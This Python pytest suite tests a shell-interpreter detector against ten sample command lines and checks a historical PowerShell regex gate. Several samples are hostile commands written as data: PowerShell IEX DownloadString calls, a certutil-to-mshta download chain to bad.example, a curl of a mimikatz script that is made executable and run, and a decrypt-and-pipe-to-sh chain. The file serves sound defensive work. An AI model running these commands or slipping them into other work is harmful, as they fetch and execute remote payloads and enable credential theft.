"""P0 · Workspace Interpreter Certification — 10-case regression suite.

Owner directive (2026-02-XX): prove the Workspace behaviour deterministically
against 10 sophisticated real-world command lines. No assumptions.

Each case checks two things:
    (a) `workspace.interpreter_ownership.detect()` classifies correctly.
    (b) The current Workspace inline gate (`\\b(powershell|pwsh)\\b` in
        routers/ops.py) would have done the WRONG thing for
        this sample — i.e. the fix is meaningful.

If (a) passes and (b) shows the historical gate was wrong, that
sample is CERTIFIED_FIXED. If (a) fails, the sample is FAIL.
"""
from __future__ import annotations

import re
import textwrap
from dataclasses import dataclass
from typing import Optional

import pytest

from workspace.interpreter_ownership import Interpreter, detect


# The Workspace inline gate as it exists TODAY in routers/ops.py
# line 1866 — reproduced here verbatim so the test proves the bug.
_HISTORICAL_PS_GATE = re.compile(
    r"\b(?:powershell(?:\.exe)?|pwsh(?:\.exe)?)\b",
    re.IGNORECASE,
)


def _historical_gate_would_fire(src: str) -> bool:
    """Reproduction of the July-20 gate — returns True when the
    current Workspace WOULD (mis)run the PS alias normalizer."""
    return bool(_HISTORICAL_PS_GATE.search(src))


@dataclass(frozen=True)
class Case:
    id: str
    label: str
    src: str
    expected: Interpreter
    historical_would_misroute: bool  # True → historical gate would have
                                      #        wrongly triggered PS stages


# ── 10 sophisticated real-world samples ──────────────────────────────

CASES = [
    Case(
        id="C1",
        label="Multi-layer Bash pipeline (base64 + openssl + awk + xxd)",
        src=(
            "echo aGVsbG8= | base64 -d | "
            "openssl enc -d -aes-256-cbc -pass pass:secret 2>/dev/null | "
            "awk '{print}' | xxd -r -p"
        ),
        expected=Interpreter.BASH,
        historical_would_misroute=False,
    ),
    Case(
        id="C2",
        label="PowerShell UTF-16LE + -EncodedCommand",
        src=(
            "powershell.exe -NoProfile -EncodedCommand "
            "SQBFAFgAKAAiAG4AZQB0ACAAdQBzAGUAcgAiACkA"
        ),
        expected=Interpreter.POWERSHELL,
        historical_would_misroute=False,
    ),
    Case(
        id="C3",
        label="CMD caret (^) obfuscation",
        src="cmd /c s^et VAR=cmd.exe && %VAR% /c whoami",
        expected=Interpreter.CMD,
        historical_would_misroute=False,
    ),
    Case(
        id="C4",
        label="CMD → PowerShell launcher (nested)",
        src=(
            'cmd /c "powershell -NoP -c '
            '\\"IEX (New-Object Net.WebClient).DownloadString(\'http://x/\')\\""'
        ),
        expected=Interpreter.CMD,   # leading launcher wins
        historical_would_misroute=False,
    ),
    Case(
        id="C5",
        label="Bash with 'powershell' keyword inside a comment",
        src=(
            "# TODO: rewrite using powershell later\n"
            "echo hi | tr -d ' ' | base64 -d"
        ),
        expected=Interpreter.BASH,
        historical_would_misroute=True,   # HISTORIC BUG — regex would fire
    ),
    Case(
        id="C6",
        label="PowerShell with 'bash' as a string literal argument",
        src=(
            'Invoke-Expression '
            '((New-Object Net.WebClient).DownloadString("http://x/bash.ps1"))'
        ),
        expected=Interpreter.POWERSHELL,
        historical_would_misroute=False,
    ),
    Case(
        id="C7",
        label="Multi-stage malware-style decode chain (Bash)",
        src=(
            "cat payload.b64 | base64 -d | gunzip | "
            "openssl enc -d -aes-256-cbc -k s3cret | sh"
        ),
        expected=Interpreter.BASH,
        historical_would_misroute=False,
    ),
    Case(
        id="C8",
        label="LOLBin chain (CMD → certutil → mshta)",
        src=(
            "cmd /c certutil -urlcache -split -f "
            "http://bad.example/p.hta %TEMP%\\p.hta && "
            "mshta %TEMP%\\p.hta"
        ),
        expected=Interpreter.CMD,
        historical_would_misroute=False,
    ),
    Case(
        id="C9",
        label="Bash payload with 'PowerShell' inside a URL",
        src=(
            "curl -s https://raw.example/PowerShell-mimikatz.ps1 | "
            "base64 -d > /tmp/x && chmod +x /tmp/x && /tmp/x"
        ),
        expected=Interpreter.BASH,
        historical_would_misroute=True,   # HISTORIC BUG — 'PowerShell'
                                            # inside URL triggers regex
    ),
    Case(
        id="C10",
        label="Polyglot: PowerShell dropper wrapping a bash string",
        src=(
            'powershell.exe -NoP -c "Invoke-Expression '
            "'bash -c \\\"echo hi | tr -d \\'\\'\\\"'\""
        ),
        expected=Interpreter.POWERSHELL,   # leading launcher wins
        historical_would_misroute=False,
    ),
]


# ── Certification harness ────────────────────────────────────────────

@pytest.mark.parametrize("case", CASES, ids=[c.id for c in CASES])
def test_workspace_interpreter_certification(case: Case) -> None:
    """Runs each sample through both engines and asserts:

    * `workspace.interpreter_ownership.detect(...)` returns the
      expected interpreter with sufficient confidence.
    * Whenever `historical_would_misroute` is True, the current
      Workspace inline gate WOULD have wrongly matched — proving the
      fix is required.
    """
    result = detect(case.src)

    # (a) Structural correctness
    assert result.interpreter == case.expected, (
        f"[{case.id}] {case.label}\n"
        f"  Expected: {case.expected.value}\n"
        f"  Got:      {result.interpreter.value} "
        f"(confidence={result.confidence})\n"
        f"  Rules fired: {[r.name for r in result.rules_fired]}\n"
        f"  Input head: {case.src[:80]!r}"
    )
    assert result.confidence >= 0.5, (
        f"[{case.id}] {case.label}: confidence too low ({result.confidence})"
    )

    # (b) Verify historical bug is real when we claim so
    historic_fires = _historical_gate_would_fire(case.src)
    if case.historical_would_misroute:
        assert historic_fires, (
            f"[{case.id}] Historical gate expected to (wrongly) fire "
            f"but did not — test case claim is inaccurate.\n"
            f"  Sample: {case.src[:120]!r}"
        )


# ── Determinism guard ────────────────────────────────────────────────

def test_certification_is_byte_deterministic() -> None:
    """Same inputs → identical outputs across two independent runs.
    Any non-determinism in the detector fails this test."""
    for case in CASES:
        a = detect(case.src).to_dict()
        b = detect(case.src).to_dict()
        assert a == b, f"[{case.id}] non-deterministic output"


def test_no_workspace_detector_import_from_shared() -> None:
    """Structural guard: `workspace.interpreter_ownership` must NEVER
    import from `decoders/`, `nivxforge/`, `operations`, or `engine/`.
    This is the isolation invariant per the P0 directive."""
    from pathlib import Path
    p = Path("/app/backend/workspace/interpreter_ownership.py")
    txt = p.read_text()
    forbidden = ["from decoders", "from nivxforge", "from engine",
                 "import operations", "from operations",
                 "from routers", "from v2"]
    for f in forbidden:
        assert f not in txt, (
            f"workspace/interpreter_ownership.py imports {f!r} — "
            f"isolation violated")
